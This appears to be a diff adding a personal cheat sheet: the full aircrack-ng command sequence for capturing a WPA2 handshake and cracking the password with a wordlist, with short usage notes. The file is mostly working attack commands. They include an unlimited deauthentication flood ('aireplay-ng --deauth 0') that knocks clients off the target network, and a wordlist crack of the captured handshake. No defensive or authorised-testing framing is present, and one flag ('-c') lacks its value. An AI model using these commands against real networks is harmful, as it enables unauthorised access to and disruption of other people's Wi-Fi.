@@ -1,0 +1,19 @@
+sudo su
+iwconfig
+airmon-ng start wlan0
+iwconfig
+airmon-ng check kill
+airodump-ng wlan0mon
+airodump-ng wlan0mon -d mac
+airodump-ng -w hack1 -c --bssid mac wlan0mon
+aireplay-ng --deauth 0 -a mac wlan0mon
+wait until you get it wpa2 handshake EAPOL
+airmon-ng stop wlan0mon
+aircrack-ng hack-01.cap -w /home/kali/wordlist.txt
+
+notes
+first time you need to unzip wordlists
+-c(mark example=c1~c11) = channel
+file .cap need directory for read cracking 
+wider range use usb wifi adapter support monitor mode
+
